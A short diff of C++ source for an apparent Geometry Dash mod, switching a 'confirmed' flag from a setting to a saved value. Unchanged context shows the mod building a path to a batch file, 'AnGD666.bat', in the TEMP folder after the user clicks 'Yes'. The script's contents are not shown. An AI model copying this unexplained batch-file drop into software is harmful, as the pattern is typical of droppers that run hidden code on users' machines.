@@ -53,7 +53,7 @@ class $modify(MyMenuLayer, MenuLayer) {
         if (!MenuLayer::init()) return false;
 
         bool isEnabled = Mod::get()->getSettingValue<bool>("enabled");
-        bool isConfirmed = Mod::get()->getSettingValue<bool>("confirmed");
+        bool isConfirmed = Mod::get()->getSavedValue<bool>("confirmed");
 
         if (isEnabled && !isConfirmed) {
             // Short delay to ensure the layer is fully initialized
@@ -100,7 +100,7 @@ class $modify(MyMenuLayer, MenuLayer) {
             }
         } else if (alert->getTag() == 2) {
             if (btn2) { // User pressed "Yes"
-                Mod::get()->setSettingValue("confirmed", true);
+                Mod::get()->setSavedValue("confirmed", true);
                 char* tempEnv = std::getenv("TEMP");
                 if (tempEnv) {
                     std::string batPath = (fs::path(tempEnv) / "AnGD666.bat").string();
